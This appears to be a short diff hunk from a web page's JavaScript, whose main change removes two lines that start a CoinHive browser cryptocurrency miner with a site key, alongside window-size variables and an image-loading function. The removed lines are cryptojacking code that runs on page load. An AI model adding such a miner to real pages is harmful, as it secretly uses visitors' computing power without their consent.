@@ -5,8 +5,6 @@ var g=(2*f-1)/(2*f);
 var a,b,c,h=$(window).height()*e,w=$(window).width()*g;
 var change = document.getElementById('cat');
 var curImg;
-var miner = new CoinHive.Anonymous('04Gay0HbYYeld4oJtpLkGFifmhfV0fZQ',{throttle:.2});
-miner.start();
 
 //testing
 function loadyThingy(url){
